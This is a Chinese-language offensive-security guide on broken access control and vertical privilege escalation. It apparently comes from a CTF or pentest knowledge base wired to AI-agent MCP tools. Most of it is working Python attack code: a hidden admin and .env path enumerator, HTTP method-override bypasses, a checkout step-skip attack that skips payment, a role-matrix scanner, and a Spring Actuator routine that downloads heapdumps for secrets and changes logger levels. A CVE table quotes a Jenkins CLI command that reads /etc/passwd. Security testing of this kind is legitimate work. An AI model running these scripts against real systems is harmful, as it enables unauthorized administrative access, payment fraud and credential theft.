# 功能级访问控制缺失 (BAC) — 垂直越权与业务逻辑绕过

## 场景

功能级访问控制缺失（Broken Access Control / BAC）比 IDOR 更隐蔽。攻击者不是"访问不属于自己的资源"，而是"执行不属于自己角色的操作"。常见于：隐藏管理端点、API 版本间鉴权不一致、多步流程步骤跳过、HTTP 方法覆写、以及角色矩阵中最少权限原则违反。

## 输入信号

- 前端 JS 中包含隐藏路由/管理入口（`/admin/`、`/dashboard/manage/`、`/internal/`）
- JS Source Map 暴露未在 UI 中展示的 API 端点
- 多步流程（注册→验证→支付→发货）各步骤 URL 可被直接调用
- API 返回 `role`、`is_admin`、`is_staff` 等权限字段
- 不同 HTTP 方法（`GET` vs `DELETE`）鉴权强度不一致
- API 版本间鉴权差异（`/api/v1/` 鉴权严格，`/api/v2/` 不鉴权或相反）
- 管理后台可通过 robots.txt、sitemap.xml、注释中泄露的路径发现
- 响应头或错误信息中包含 `X-Admin-Panel: true`, `role: user` 等调试信息

## 核心方法论

### 1. 隐藏端点发现矩阵

管理面板和隐藏 API 端点是 BAC 攻击的入口。使用多层发现策略：

```python
# hidden_endpoint_scanner.py — 多层隐藏端点发现
import requests, re, json
from urllib.parse import urljoin

class HiddenEndpointScanner:
    def __init__(self, base_url, session=None):
        self.base = base_url.rstrip('/')
        self.s = session or requests.Session()
        self.found = set()

    # === 层级 1: JS Source Map 重建 ===
    def from_source_maps(self):
        """从 JS Source Map 提取隐藏路径"""
        endpoints = set()
        # 1. 获取主 JS bundle
        js_patterns = ["/static/js/main.*.js", "/assets/app-*.js", "/js/bundle.*.js",
                       "/dist/app.*.js", "/build/static/js/*.js"]

        # 2. 查找 sourceMappingURL
        for pattern in js_patterns:
            # 在页面 HTML 中查找 script src
            pass

        # 3. 使用 unwebpack-sourcemap 反解
        # 命令行: npx unwebpack-sourcemap --bundle bundle.js --map bundle.js.map
        return endpoints

    # === 层级 2: 字典枚举 ===
    HIDDEN_PATHS = [
        # Admin panels
        "/admin", "/admin/", "/admin/dashboard", "/admin/panel", "/admin/console",
        "/administrator", "/backend", "/manage", "/management", "/dashboard",
        "/manager", "/controlpanel", "/cp", "/cpanel", "/admincp",

        # API hidden
        "/api/admin", "/api/v1/admin", "/api/v2/internal", "/api/private",
        "/api/debug", "/api/sandbox", "/api/test", "/api/mock", "/api/dev",
        "/internal", "/internal/api", "/private", "/restricted",

        # CMS common
        "/wp-admin", "/joomla/administrator", "/drupal/admin", "/magento/admin",

        # Swagger / API docs
        "/swagger", "/swagger-ui.html", "/swagger/index.html", "/swagger.json",
        "/api-docs", "/v2/api-docs", "/v3/api-docs", "/openapi.json",
        "/graphql", "/graphiql", "/playground", "/docs", "/redoc",

        # Config / debug
        "/debug", "/config", "/configuration", "/settings", "/setup",
        "/install", "/phpinfo.php", "/info.php", "/.env", "/.git/config",

        # Actuator (Spring Boot)
        "/actuator", "/actuator/health", "/actuator/env", "/actuator/beans",
        "/actuator/mappings", "/actuator/httptrace", "/actuator/loggers",

        # Dev tools
        "/dev", "/dev/console", "/dev-api", "/dev/tools",
        "/_debug_toolbar", "/__debug__",
    ]

    def dictionary_enumerate(self, extra_paths: list = None):
        """字典枚举隐藏路径"""
        paths = self.HIDDEN_PATHS + (extra_paths or [])
        for path in paths:
            for method in ["GET", "POST", "OPTIONS"]:
                try:
                    r = self.s.request(method, self.base + path, timeout=8,
                                       allow_redirects=False)
                    # 关注: 200 OK, 405 Method Not Allowed (端点存在),
                    # 401/403 代表存在但受保护 (非 404)
                    if r.status_code not in (404,):
                        self.found.add((method, path, r.status_code, r.text[:150]))
                except:
                    continue
        return self.found

    # === 层级 3: robots.txt / sitemap.xml ===
    def from_robots(self):
        """从 robots.txt 和 sitemap.xml 提取隐藏路径"""
        sources = ["/robots.txt", "/sitemap.xml", "/sitemap_index.xml"]
        for src in sources:
            r = self.s.get(self.base + src, timeout=10)
            if r.status_code == 200:
                # 提取 Disallow 路径
                disallows = re.findall(r'Disallow:\s*(/\S+)', r.text)
                for d in disallows:
                    self.found.add(("GET", d, 200, f"from {src}"))
        return self.found

    # === 层级 4: 响应头注入 ===
    def from_response_headers(self, html: str):
        """从 HTML 注释和 JS 变量中提取"""
        # HTML 注释: <!-- /admin/super/secret -->
        comments = re.findall(r'<!--\s*(.*?)\s*-->', html)
        for c in comments:
            if c.startswith('/') or 'admin' in c.lower() or 'api' in c.lower():
                self.found.add(("GET", c, 200, "from html comment"))
        # JS 变量: var API_BASE = '/api/v2'
        js_vars = re.findall(r'(?:url|path|endpoint|api|route)\s*[=:]\s*["\']([^"\']+)["\']',
                             html, re.IGNORECASE)
        for v in js_vars:
            if v.startswith('/'):
                self.found.add(("GET", v, 200, "from js var"))
        return self.found
```

### 2. HTTP 方法覆写绕过

许多框架支持 HTTP 方法覆写用于兼容性。这是 BAC 绕过的经典通道：

```python
# method_override_bypass.py — HTTP 方法覆写绕过鉴权

METHOD_OVERRIDE_VECTORS = [
    # === 标准方法覆写头 ===
    {"X-HTTP-Method": "DELETE"},
    {"X-HTTP-Method-Override": "DELETE"},
    {"X-Method-Override": "DELETE"},

    # === 表单方法覆写 (Rails/Django) ===
    {"_method": "DELETE"},  # POST body 中

    # === GET → POST 绕过 (某些框架 GET 不鉴权) ===
    # 发送 POST 但用下面方式改回 GET:

    # === 绕过示例: 删除接口只鉴权 DELETE, 不鉴权 GET ===
    # 但 POST 带上 ?_method=DELETE 或 X-HTTP-Method-Override: DELETE

    # === OPTIONS → 绕过清单 ===
    # OPTIONS 请求通常不鉴权，返回 Allow 头中可能暴露方法
]

def test_method_override(base_url, endpoint, session):
    """测试方法覆写绕过"""
    results = {}

    # Baseline: 直接 DELETE 是否被拦
    r = session.delete(f"{base_url}{endpoint}")
    results["direct_DELETE"] = r.status_code

    # 测试覆写
    for header in METHOD_OVERRIDE_VECTORS[:6]:
        headers = {**header}
        if isinstance(header, dict) and list(header.keys())[0].startswith("X-"):
            r = session.post(f"{base_url}{endpoint}", headers=headers)
        else:
            r = session.post(f"{base_url}{endpoint}", data=header)

        results[f"POST + {list(header.keys())[0]}"] = r.status_code
        if r.status_code == 200:
            print(f"[!] Bypass: POST with {header} → {r.status_code}")
            print(f"    Body: {r.text[:300]}")

    return results
```

### 3. API 版本鉴权差异

不同 API 版本可能由不同中间件处理，或新版本忘了加鉴权：

```python
# api_version_pivoting.py — API 版本切换绕过鉴权

def test_api_version_bypass(base_url, endpoint, session):
    """测试 API 版本间鉴权差异"""
    version_patterns = [
        # 路径前缀
        "/api/v1{endpoint}",
        "/api/v2{endpoint}",
        "/api/v3{endpoint}",
        "/api/v4{endpoint}",
        "/api/v0{endpoint}",     # 老版本
        "/api/{endpoint}",       # 无版本
        "/api/private/v1{endpoint}",
        "/api/public/v1{endpoint}",

        # 头版本化
        # Accept: application/vnd.api.v1+json
        # Accept: application/vnd.api.v2+json
    ]

    results = {}
    for pattern in version_patterns:
        url = base_url + pattern.format(endpoint=endpoint)
        for accept in [
            "application/json",
            "application/vnd.api+json",
            "application/vnd.api.v1+json",
            "application/vnd.api.v2+json",
            "text/html",
            "application/xml",
        ]:
            r = session.get(url, headers={"Accept": accept}, timeout=8)
            if r.status_code == 200 and "error" not in r.text[:100].lower():
                results[f"{pattern} + {accept}"] = {
                    "status": r.status_code,
                    "preview": r.text[:200],
                    "method": "GET"
                }
    return results
```

### 4. 多步流程步骤跳过

业务流程（注册→验证→支付→发货）中的每一步都是一个 BAC 攻击点：

```python
# step_skip_attack.py — 多步流程跳过

class StepSkipAttack:
    """
    业务流程步骤跳过检测
    
    典型场景:
    - 购物车 → 填写地址 → 支付 → 确认 → 发货
    - 注册 → 邮箱验证 → 完善资料 → 激活
    - 创建工单 → 审核 → 处理 → 关闭
    """

    FLOW_TEMPLATES = {
        "payment": {
            "steps": ["cart", "address", "payment", "confirm", "deliver"],
            "skip_targets": [
                ("cart", "confirm"),      # 跳过支付
                ("payment", "deliver"),   # 跳过确认
                ("cart", "deliver"),      # 直达发货
            ],
            "endpoints": {
                "cart":    "/api/order/cart",
                "address": "/api/order/address",
                "payment": "/api/order/pay",
                "confirm": "/api/order/confirm",
                "deliver": "/api/order/deliver",
            }
        },
        "registration": {
            "steps": ["register", "verify", "profile", "activate"],
            "skip_targets": [
                ("register", "activate"),    # 跳过邮箱验证
                ("register", "profile"),     # 在验证前完善资料
            ],
            "endpoints": {
                "register": "/api/auth/register",
                "verify":   "/api/auth/verify-email",
                "profile":  "/api/user/profile",
                "activate": "/api/user/activate",
            }
        },
    }

    def __init__(self, base_url, session):
        self.base = base_url
        self.s = session

    def test_skip(self, flow_name: str, skip_from: str, skip_to: str):
        """测试跳过中间步骤"""
        flow = self.FLOW_TEMPLATES.get(flow_name)
        if not flow:
            return None

        # 执行到 skip_from 步骤
        state = self._execute_to_step(flow, skip_from)
        if not state:
            return None

        # 直接调用 skip_to 步骤
        target_ep = flow["endpoints"].get(skip_to)
        if not target_ep:
            return None

        r = self.s.post(f"{self.base}{target_ep}",
                        json={"order_id": state.get("order_id")},
                        timeout=10)

        return {
            "flow": flow_name,
            "skip": f"{skip_from} → {skip_to}",
            "status": r.status_code,
            "body": r.text[:300],
            "bypassed": r.status_code == 200 and "error" not in r.text[:100].lower()
        }

    def _execute_to_step(self, flow, step_name):
        """执行流程直到指定步骤"""
        # 简化实现: 执行到目标步骤并返回 state
        state = {}
        steps = flow["steps"]
        target_idx = steps.index(step_name) if step_name in steps else -1

        for i, step in enumerate(steps):
            if step == step_name:
                break
            # 调用端点
            ep = flow["endpoints"].get(step)
            if not ep:
                continue
            r = self.s.post(f"{self.base}{ep}", json={}, timeout=10)
            if r.status_code == 200:
                try:
                    data = r.json()
                    if "order_id" in data:
                        state["order_id"] = data["order_id"]
                except:
                    pass
        return state
```

### 5. 角色矩阵测试

测试所有端点 × 所有角色的访问矩阵是 BAC 检测的黄金标准：

```python
# role_matrix_test.py — 角色-权限矩阵测试

ROLE_PERMUTATIONS = {
    "anonymous": {"headers": {}, "description": "未认证用户"},
    "basic_user": {"headers": {"Authorization": "Bearer USER_TOKEN"}, "description": "普通用户"},
    "premium_user": {"headers": {"Authorization": "Bearer PREMIUM_TOKEN"}, "description": "付费用户"},
    "moderator": {"headers": {"Authorization": "Bearer MOD_TOKEN"}, "description": "版主"},
    "admin": {"headers": {"Authorization": "Bearer ADMIN_TOKEN"}, "description": "管理员"},
    "super_admin": {"headers": {"Authorization": "Bearer SUPER_TOKEN"}, "description": "超级管理员"},
}

def role_matrix_scan(endpoints: list, tokens: dict):
    """测试不同角色对不同端点的访问权限"""
    matrix = {}

    for ep_name, ep_config in endpoints:
        matrix[ep_name] = {}
        method = ep_config.get("method", "GET")
        path = ep_config["path"]

        for role_name, role_config in tokens.items():
            s = requests.Session()
            s.headers.update(role_config["headers"])

            if method == "GET":
                r = s.get(path)
            elif method in ("POST", "PUT", "PATCH"):
                r = s.request(method, path, json=ep_config.get("data", {}))
            elif method == "DELETE":
                r = s.delete(path)
            elif method == "OPTIONS":
                r = s.options(path)

            result = f"{r.status_code}"
            if r.status_code == 200:
                result += f" ({len(r.text)}b)"

            matrix[ep_name][role_name] = result

            # 检测越权: 低权限角色访问了高权限端点
            if r.status_code == 200 and ep_config.get("min_role") and \
               role_config.get("level", 99) < ep_config["min_role"]:
                print(f"[!] BAC: {role_name} can access {ep_name} (min_role={ep_config['min_role']})")
                print(f"    {method} {path} → {r.text[:200]}")

    return matrix
```

### 6. Spring Boot Actuator 端点利用

Spring Boot Actuator 暴露了大量管理端点，常因疏忽未做鉴权：

```python
# actuator_attack.py — Spring Boot Actuator 端点利用

ACTUATOR_ENDPOINTS = {
    # 信息泄露
    "/actuator": "端点列表",
    "/actuator/health": "健康状态",
    "/actuator/info": "应用信息",
    "/actuator/env": "环境变量 (含密钥)",
    "/actuator/configprops": "配置属性",
    "/actuator/beans": "Spring Bean 列表",
    "/actuator/mappings": "所有 URL 映射 — 发现隐藏端点",

    # 操作类 (需要鉴权, 但常被忽略)
    "/actuator/shutdown": "关闭应用",
    "/actuator/restart": "重启",
    "/actuator/refresh": "刷新配置",
    "/actuator/loggers": "动态修改日志级别",
    "/actuator/loggers/ROOT": "设置 ROOT 日志为 DEBUG",
    "/actuator/heapdump": "下载 Heap Dump (含内存中密码)",
    "/actuator/threaddump": "线程 Dump",
    "/actuator/prometheus": "Prometheus 指标",
}

def exploit_actuator(base_url):
    """利用 Spring Boot Actuator"""
    results = {}
    s = requests.Session()

    for endpoint, desc in ACTUATOR_ENDPOINTS.items():
        url = f"{base_url}{endpoint}"
        r = s.get(url, timeout=10)
        if r.status_code == 200:
            results[endpoint] = {
                "description": desc,
                "status": 200,
                "size": len(r.text),
                "preview": r.text[:200],
            }

            # 特殊处理: heapdump 下载
            if "heapdump" in endpoint:
                # heapdump 可能包含: 数据库密码, API 密钥, JWT secret
                with open("heapdump.bin", "wb") as f:
                    f.write(r.content)
                results[endpoint]["downloaded"] = True

            # 特殊处理: loggers 漏洞利用
            if "loggers" in endpoint and "ROOT" in endpoint:
                # 设置 DEBUG 日志可能泄露更多信息
                r2 = s.post(url, json={"configuredLevel": "DEBUG"})
                results[endpoint]["debug_set"] = r2.status_code

    return results
```

### 7. 真实 CVE 深度分析

| CVE | 产品 | 原理 | 利用链 |
|-----|------|------|--------|
| CVE-2026-32270 | Craft Commerce 4.x | 匿名支付时邮箱验证失败，JSON 错误响应仍序列化完整订单对象（含 PII），`authorizeAccess` 在异常路径中未调用 | 提交无效邮箱到 checkout → 获取完整订单数据 |
| CVE-2025-27713 | Jenkins CLI | `hudson.remoting.Callable` 反序列化未鉴权，任意用户可执行管理操作 | 构造恶意 serialized 对象 → 发送到 TCP 端口 |
| CVE-2025-29926 | Spring Authorization Server | 不同 PKCE 挑战方法间鉴权不一致，`S256` 绕过某些端点 | 切换 `code_challenge_method` 值 |
| CVE-2024-23897 | Jenkins (CVSS 9.8) | `args4j` CLI 参数展开，`@` 字符可读取任意文件 | `java -jar jenkins-cli.jar who-am-i @/etc/passwd` |

## 攻击链

```
Phase 1 — 面收集
  ├── JS Source Map 反解
  ├── 字典枚举隐藏路径
  ├── robots.txt / sitemap.xml
  └── API 文档泄漏 (Swagger/OpenAPI/GraphQL introspection)

Phase 2 — 鉴权差异探测
  ├── 各角色 × 各端点矩阵测试
  ├── API 版本间隔切换
  ├── HTTP 方法覆写
  └── Content-Type 切换 (JSON vs XML vs form)

Phase 3 — 流程绕过
  ├── 多步流程步骤跳过
  ├── 状态机非法转换
  └── 直接调用内部端点

Phase 4 — 权限提升
  ├── Spring Actuator 利用
  ├── 管理面板功能滥用
  └── 获取高权限后横向移动
```

## MCP 工具映射

AI Agent 可调用以下 MCP 工具自动检测上述漏洞：

| 攻击步骤 | MCP 工具 | 说明 |
|---------|---------|------|
| HTTP 探测隐藏端点 | `http_probe` | 字典枚举管理面板路径 |
| 按信号查知识库 | `kb_router` | 搜索 BAC/hidden endpoint/admin bypass 相关技术文件 |
| 阅读技术细节 | `kb_read_file` | 读取本文档获取完整攻击链 |
| 运行扫描工具 | `run_ctf_tool` | 使用 dirsearch/gobuster 枚举隐藏端点 |

## 参考资料

- [CVE-2026-32270] Craft Commerce — Anonymous Payment Authorization Bypass
- [CVE-2025-27713] Jenkins CLI — Unauthenticated Remote Code Execution
- [CWE-862] Missing Authorization
- [CWE-306] Missing Authentication for Critical Function
- OWASP: Testing for Bypassing Authorization Schema (WSTG-ATHZ-02)
- PortSwigger: "How to Test API Versioning for Authorization Bugs"

## 证据与验证闭环

- 保存 baseline 与单变量 probe 的完整请求、响应状态、关键响应头和正文摘要。
- 将“响应差异”与服务端副作用分开记录；只有权限、状态、数据或 Flag 可重复变化才算确认。
- 从全新 session/重置状态最小化重放，记录依赖、并发参数、时间窗口及失败样本。
- 输出统一放入 `exports/ctf-website/<case>/`，凭据只用 `REDACTED` 占位，自动检索 `flag{}`、`CTF{}`、`DASCTF{}`。
